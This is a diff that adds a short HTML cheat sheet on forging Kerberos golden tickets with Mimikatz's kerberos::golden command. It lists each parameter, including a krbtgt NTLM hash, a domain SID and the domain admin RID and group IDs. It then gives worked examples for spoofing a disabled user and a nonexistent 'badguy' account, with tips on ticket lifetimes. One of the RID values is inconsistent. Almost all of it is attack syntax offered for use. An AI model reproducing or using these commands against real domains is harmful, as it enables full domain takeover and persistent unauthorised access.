@@ -1,0 +1,54 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Creation</title>
+</head><body>kerberos::golden<br/>
+/domain: domain.local 							domain name<br/>
+/sid: S-1-5-21-130452501-2365100805-3685010670	domain SID<br/>
+/rc4: 310b643c5316c8c3c70a10cfb17e2e31 		NTLM hash of krbtgt<br/>
+/user: Administrator 							username you wanna be<br/>
+/id: 500 										RID of username (500 is THE domain admin)<br/>
+/groups: 513, 512, 520, 518, 519 					Groups list of the user (be imaginative)<br/>
+/ticket: Administrator.kirbi 						The ticket filename<br/>
+<br/>
+<br/>
+Client name: Administrator<br/>
+Service name: krbtgt/domain.local<br/>
+Validity<br/>
+	Start time: <br/>
+	End time:<br/>
+Authorization data Microsoft (PAC)<br/>
+Username: Adminsitrator<br/>
+Domain SID<br/>
+User ID 500<br/>
+Groups ID<br/>
+	512<br/>
+	519 <br/>
+	...<br/>
+<br/>
+Example time!<br/>
+We want to have a long time access to a share limited to a user &quot;utilisateur&quot;, disabled<br/>
+kerberos::golden<br/>
+/domain: domain.local<br/>
+/sid: utilisateur's sid<br/>
+/aes256: hash<br/>
+/user: srvcharly$ 			&lt;= real account always in good state<br/>
+/id: 1001 				&lt;= RID of the real account<br/>
+/groups: 513, 1106 		&lt;= 1107 is the RID of the &quot;utilisateur&quot; account...yep...in groups<br/>
+/ticket: fake_utilisateur.kirbi<br/>
+<br/>
+More examples<br/>
+kerberos::golden<br/>
+/domain: domain.local<br/>
+/sid: Administrator's sid<br/>
+/rc4: hash<br/>
+/user: badguy<br/>
+/id: 0xffffffff<br/>
+/groups: 513, 512, 520, 518, 519<br/>
+/ticket: badguy.kirbi<br/>
+<br/>
+Yes, neither the User NOR the ID exist, so this TGT will only work for 20 minutes (TGS watchdog)<br/>
+	It works if an ACL is defined with groups (this example spoofs a user in domain admins group; 512)<br/>
+	But all TGS obtained in this 20 minutes will be valid for 10h!<br/>
+	AND you can make multiple TGTs...<br/>
+</body></html>
